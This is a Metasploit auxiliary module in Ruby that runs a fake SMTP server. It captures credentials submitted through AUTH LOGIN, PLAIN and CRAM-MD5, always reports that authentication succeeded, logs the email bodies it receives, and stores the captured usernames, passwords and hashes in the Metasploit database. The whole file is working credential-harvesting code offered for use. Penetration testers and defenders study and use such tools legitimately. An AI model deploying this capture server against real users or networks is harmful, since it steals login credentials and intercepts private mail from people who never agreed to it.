##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/hashes/identify'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::TcpServer
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name' => 'Authentication Capture: SMTP',
      'Description' => %q{
        This module provides a fake SMTP service that
      is designed to capture authentication credentials.
      },
      'Author' => ['ddz', 'hdm', 'h00die'],
      'License' => MSF_LICENSE,
      'Actions' =>
        [
          [ 'Capture', 'Description' => 'Run SMTP capture server' ]
        ],
      'PassiveActions' =>
        [
          'Capture'
        ],
      'DefaultAction' => 'Capture',
      'References' =>
        [
          [ 'URL', 'https://www.samlogic.net/articles/smtp-commands-reference-auth.htm' ],
          [ 'URL', 'tools.ietf.org/html/rfc5321' ],
          [ 'URL', 'http://fehcom.de/qmail/smtpauth.html' ]
        ],
    )

    register_options(
      [
        OptPort.new('SRVPORT', [ true, 'The local port to listen on.', 25 ])
      ]
    )
  end

  def setup
    super
    @state = {}
  end

  def run
    exploit
  end

  def auth_plain_parser(data)
    # this data is \00 delimited, and has 3 fields: un\00un\00\pass.  Not sure why a double username, but we drop the first one
    data = Rex::Text.decode_base64(data).split("\00")
    data = data.drop(1)

    # if only a username is submitted, it will appear as \00un\00
    # we already cut off the empty username, so nowe we want to add on the empty password
    if data.length == 1
      data << ""
    end
    data
  end

  def on_client_connect(client)
    @state[client] = { name: "#{client.peerhost}:#{client.peerport}", ip: client.peerhost, port: client.peerport, user: nil, pass: nil }
    client.put "220 SMTP Server Ready\r\n"
  end

  def on_client_data(client)
    data = client.get_once
    return if !data

    print_status("SMTP: #{@state[client][:name]} Command: #{data.strip}")

    if (@state[client][:data_mode])
      @state[client][:data_buff] ||= ''
      @state[client][:data_buff] += data

      idx = @state[client][:data_buff].index("\r\n.\r\n")
      if data.include? "RSET\r\n"
        idx = @state[client][:data_buff].index("RSET\r\n")
      end
      if idx
        report_note(
          host: @state[client][:ip],
          type: 'smtp_message',
          data: @state[client][:data_buff][0, idx]
        )
        @state[client][:data_buff][0, idx].split("\n").each do |line|
          print_status("SMTP: #{@state[client][:name]} EMAIL: #{line.strip}")
        end

        @state[client][:data_buff] = nil
        @state[client][:data_mode] = nil
        client.put "250 OK\r\n"
      end

      return
    end

    if (@state[client][:auth_login])
      if @state[client][:user].nil?
        @state[client][:user] = Rex::Text.decode_base64(data)
        client.put "334 #{Rex::Text.encode_base64('Password')}\r\n"
        return
      end
      @state[client][:pass] = Rex::Text.decode_base64(data)
      print_good("SMTP LOGIN #{@state[client][:name]} #{@state[client][:user]} / #{@state[client][:pass]}")
      report_cred(
        ip: @state[client][:ip],
        port: datastore['SRVPORT'],
        service_name: 'smtp',
        user: @state[client][:user],
        password: @state[client][:pass],
        proof: data # will be base64 encoded, but its proof...
      )
      @state[client][:auth_login] = nil
      client.put "235 2.7.0 Authentication successful\r\n"
      return
    end

    if (@state[client][:auth_plain])
      # this data is \00 delimited, and has 3 fields: un\00un\00\pass.  Not sure why a double username
      un_pass = auth_plain_parser data

      @state[client][:user] = un_pass.first
      @state[client][:pass] = un_pass.last
      print_good("SMTP LOGIN #{@state[client][:name]} #{@state[client][:user]} / #{@state[client][:pass]}")
      report_cred(
        ip: @state[client][:ip],
        port: datastore['SRVPORT'],
        service_name: 'smtp',
        user: @state[client][:user],
        password: @state[client][:pass],
        proof: data # will be base64 encoded, but its proof...
      )
      @state[client][:auth_plain] = nil
      client.put "235 2.7.0 Authentication successful\r\n"
      return
    end

    if (@state[client][:auth_cram])
      # data is <username><space><digest aka hash>
      decoded = Rex::Text.decode_base64(data).split(' ')
      @state[client][:user] = decoded.first
      # challenge # response
      @state[client][:pass] = "#{@state[client][:auth_cram_challenge]}##{decoded.last}"
      report_cred(
        ip: @state[client][:ip],
        port: datastore['SRVPORT'],
        service_name: 'smtp',
        user: @state[client][:user],
        password: @state[client][:pass],
        proof: data, # will be base64 encoded, but its proof...
        type: 'cram'
      )
      client.put "235 2.7.0 Authentication successful\r\n"
      print_good("SMTP LOGIN #{@state[client][:name]} #{@state[client][:user]} / #{@state[client][:pass]}")
      @state[client][:auth_cram_challenge] = nil
      @state[client][:auth_cram] = nil
      return
    end

    cmd, arg = data.strip.split(/\s+/, 2)
    arg ||= ''

    case cmd.upcase
    when 'HELO', 'EHLO'
      client.put "250 OK\r\n"
      return

    when 'MAIL'
      _, from = data.strip.split(':', 2)
      @state[client][:from] = from.strip
      client.put "250 OK\r\n"
      return

    when 'RCPT'
      _, targ = data.strip.split(':', 2)
      @state[client][:rcpt] = targ.strip
      client.put "250 OK\r\n"
      return

    when 'DATA'
      @state[client][:data_mode] = true
      client.put "354 Send message content; end with <CRLF>.<CRLF>\r\n"
      return

    when 'QUIT'
      client.put "221 OK\r\n"
      return

    when 'PASS'

      @state[client][:pass] = arg

      report_cred(
        ip: @state[client][:ip],
        port: datastore['SRVPORT'],
        service_name: 'pop3',
        user: @state[client][:user],
        password: @state[client][:pass],
        proof: arg
      )
      print_good("SMTP LOGIN #{@state[client][:name]} #{@state[client][:user]} / #{@state[client][:pass]}")
      return

    when 'AUTH'
      if arg == 'LOGIN'
        @state[client][:auth_login] = true
        client.put "334 #{Rex::Text.encode_base64('Username')}\r\n"
        return
      elsif arg.split(' ').first == 'PLAIN'
        if arg.include? ' ' # the creds are passed as well
          un_pass = auth_plain_parser arg.split(' ').last

          @state[client][:user] = un_pass.first
          @state[client][:pass] = un_pass.last
          print_good("SMTP LOGIN #{@state[client][:name]} #{@state[client][:user]} / #{@state[client][:pass]}")
          report_cred(
            ip: @state[client][:ip],
            port: datastore['SRVPORT'],
            service_name: 'smtp',
            user: @state[client][:user],
            password: @state[client][:pass],
            proof: data # will be base64 encoded, but its proof...
          )
          client.put "235 2.7.0 Authentication successful\r\n"
          return
        end
        @state[client][:auth_plain] = true
        client.put "334\r\n"
        return
      elsif arg == 'CRAM-MD5'
        # create and send challenge
        challenge = "<#{Rex::Text.rand_text_numeric(9..12)}@#{datastore['SRVHOST']}>"
        client.put "334 #{Rex::Text.encode_base64(challenge)}\r\n"
        @state[client][:auth_cram] = true
        @state[client][:auth_cram_challenge] = challenge
        return
      end
      # some other auth we dont understand
      vprint_error("Unknown authentication type string: #{arg}")
      client.put "503 Server Error\r\n"
    else
      vprint_error("Unknown command: #{arg}")
    end
    client.put "503 Server Error\r\n"

  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }
    if opts[:type] == 'cram'
      credential_data = {
        origin_type: :service,
        module_fullname: fullname,
        username: opts[:user],
        private_data: opts[:password],
        private_type: :nonreplayable_hash,
        jtr_format: identify_hash(opts[:password])
      }.merge(service_data)
    else
      credential_data = {
        origin_type: :service,
        module_fullname: fullname,
        username: opts[:user],
        private_data: opts[:password],
        private_type: :password
      }.merge(service_data)
    end

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def on_client_close(client)
    @state.delete(client)
  end

end
